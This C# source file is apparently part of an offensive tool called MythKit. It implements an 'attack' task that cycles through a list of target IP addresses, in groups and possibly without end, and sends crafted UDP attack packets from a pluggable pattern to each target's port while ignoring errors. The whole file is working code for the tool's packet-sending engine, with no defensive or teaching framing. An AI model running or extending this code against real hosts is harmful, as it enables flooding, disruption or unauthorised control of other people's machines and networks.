using MythKit.Tasks;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;

namespace MythKit.Pages.UDPAttack
{
    public class AttackManagedTask : IManagedTask
    {
        public string TaskName => "发动攻击的影像";

        public TaskState State => TaskState.Running;
        private int _progress;
        public int Progress { get => _progress; set { _progress = value; ProgressUpdated?.Invoke(_progress); } }
        public FrameworkElement DetailContentView { get => throw new NotImplementedException(); set => throw new NotImplementedException(); }
        public bool IsDetailViewReady => false;

        public bool IsIndeterminate => Config.TotalCycles == null;
        public AttackConfig Config;
        public event Action<int> ProgressUpdated;
        public event Action<string> StateMessageUpdated;
        public event Action<TaskState> StateUpdated;
        public AttackManagedTask(AttackConfig config)
        {
            Config = config;
        }

        public int CurrentCycle { get; private set; } = 1;
        public int CurrentGroup { get; private set; } = 1;
        public int CurrentTargetIndex { get; private set; } = 1;
        public async Task ExecuteAsync(CancellationToken cancellationToken)
        {
            StateUpdated?.Invoke(TaskState.Running);
            try
            {
                for (; Config.TotalCycles == null || CurrentCycle <= Config.TotalCycles.Value; CurrentCycle++)
                {
                    if (CurrentCycle != 1)
                    {
                        await Task.Delay(Config.CycleIntervalMilliseconds, cancellationToken);
                    }
                    CurrentGroup = 1;
                    for (CurrentTargetIndex = 1; CurrentTargetIndex <= Config.TargetIPs.Count; CurrentTargetIndex++)
                    {
                        if (Config.GroupConfig != null && CurrentTargetIndex != 1 && (CurrentTargetIndex - 1) % Config.GroupConfig.Value.SingleGroupSize == 0)
                        {
                            CurrentGroup++;
                            await Task.Delay(Config.GroupConfig.Value.GroupIntevalMilliseconds, cancellationToken);
                        }
                        var targetIP = Config.TargetIPs[CurrentTargetIndex - 1];
                        StateMessageUpdated?.Invoke($"第 {CurrentCycle} 轮，第 {CurrentTargetIndex}/{Config.TargetIPs.Count} 个目标: {targetIP}");
                        string errorMessage = "";
                        AttackPacket packets = null;
                        App.Current.Dispatcher.Invoke(() =>
                        {
                            packets = Config.AttackPattern.ConstructPacket(ref errorMessage, targetIP.ToString(), CurrentCycle, CurrentGroup);
                        });
                        for (int packetCount = 0; packetCount < packets.AttackPackets.Count; packetCount++)
                        {
                            UdpClient udpClient = new UdpClient();
                            byte[] packet = packets.AttackPackets[packetCount];
                            try
                            {
                                udpClient.Send(packet, packet.Length, targetIP.ToString(), packets.TargetPort);
                            }
                            catch
                            {
                            }
                            if (packets.IntervalMiliseconds > 0 && packetCount == packets.AttackPackets.Count - 1)
                            {
                                await Task.Delay(packets.IntervalMiliseconds, cancellationToken);
                            }
                        }
                        if (cancellationToken.IsCancellationRequested)
                        {
                            StateUpdated?.Invoke(TaskState.Cancelled);
                            return;
                        }
                    }
                }
                StateUpdated?.Invoke(TaskState.Completed);
            }
            catch (OperationCanceledException)
            {
                StateUpdated?.Invoke(TaskState.Cancelled);
                return;
            }
        }
    }
}
